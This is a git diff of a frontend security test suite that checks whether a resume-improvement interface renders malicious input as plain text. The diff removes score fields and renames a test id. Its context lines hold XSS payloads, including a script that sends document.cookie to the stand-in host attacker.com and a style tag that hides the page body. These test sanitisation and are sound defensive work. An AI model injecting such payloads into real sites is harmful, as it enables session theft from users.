@@ -18,7 +18,6 @@ describe('Phase 8B Security & Sanitization Suite', () => {
   // =========================================================================
   it('renders malicious XSS script tags and prompt injections in Mode A as inert plain text', () => {
     const maliciousModeA: ImprovementsResponse = {
-      atsScore: 60.0,
       atsFixes: [
         {
           hazardCode: '<script>alert("xss-hazard")</script>',
@@ -64,7 +63,7 @@ describe('Phase 8B Security & Sanitization Suite', () => {
     });
 
     // Content is rendered as plain text strings
-    expect(screen.getByTestId('ats-fix-item-0').textContent).toContain('<script>alert("xss-hazard")</script>');
+    expect(screen.getByTestId('resume-fix-item-0').textContent).toContain('<script>alert("xss-hazard")</script>');
     expect(screen.getByTestId('content-finding-0').textContent).toContain(
       '<script>document.location="http://attacker.com?cookie="+document.cookie</script>'
     );
@@ -100,7 +99,6 @@ describe('Phase 8B Security & Sanitization Suite', () => {
           },
         ],
         match_score: 85.0,
-        ats_score: 75.0,
         verdict_band: 'strong',
         matched_skills: ['<script>'],
         missing_skills: ['<style>body{display:none}</style>'],
